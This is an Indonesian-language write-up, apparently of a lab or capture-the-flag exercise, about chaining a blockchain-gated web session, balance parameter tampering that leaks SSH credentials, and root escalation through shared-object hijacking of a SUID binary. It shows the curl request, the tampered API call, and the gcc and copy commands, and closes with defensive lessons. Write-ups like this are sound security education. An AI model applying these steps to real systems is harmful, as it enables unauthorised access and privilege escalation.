Research // Web3-003

Web3 Bridge Hijacking

#web3-interaction #logic-flaw #shared-object-hijacking

Executive Summary

"Operasi ini mendemonstrasikan kerentanan pada infrastruktur hibrida yang menggabungkan Dashboard Web2 dan Node Blockchain. Eksploitasi dimulai dari manipulasi logika bisnis pada platform trading hingga eskalasi hak akses Root melalui pembajakan library (Shared Object Hijacking) pada biner sistem SUID."

01

/ Blockchain to Web Pivot

Pemindaian awal mengungkap layanan RPC Blockchain pada port 8545. Aplikasi web menggunakan status audit di blockchain sebagai gerbang autentikasi. Dengan berinteraksi langsung ke Smart Contract, kami memvalidasi integritas sesi secara manual.

# Verifying transaction hash to generate session
curl -X POST -H "Content-Type: application/json" \ -d '{"integrity_hash": "0xd6a3af9b17a..."}' \ http://target.internal/api/v2/verify
RESULT: session_id = 1775577374620_anon_sec
02

/ Business Logic: Parameter Tampering

Platform memiliki fitur trading yang memberikan kredensial SSH jika saldo mencapai ambang batas tertentu. Ditemukan celah Parameter Tampering pada endpoint reset saldo yang memungkinkan manipulasi nilai secara bebas. 

# Manipulating account balance via API
POST /api/trading/reset?session_id=1775577374620_anon_sec
{ "balance": 99999 }

RESULT: Kredensial SSH diperoleh (operator : P@ssw0rd_Acc3ss)
03

/ PrivEsc: Shared Object Hijacking

Setelah mendapatkan shell, ditemukan biner SUID internal-sync yang memuat library dari direktori dengan izin tulis global (World Writable).

# Compiling malicious shared object
gcc -shared -o /tmp/libaudit_core.so -fPIC payload.c
# Replacing original library
cp /tmp/libaudit_core.so /opt/internal/lib/writable/
./internal-sync
root# whoami
root

04 LESSONS LEARNED

Web3 Safety

Gunakan verifikasi off-chain yang kuat untuk sinkronisasi data blockchain ke aplikasi web.

Logic Validation

Input sensitif seperti saldo harus divalidasi di sisi server (Server-side validation).

Folder Permissions

Jangan pernah memberikan izin tulis global (777) pada direktori library sistem.
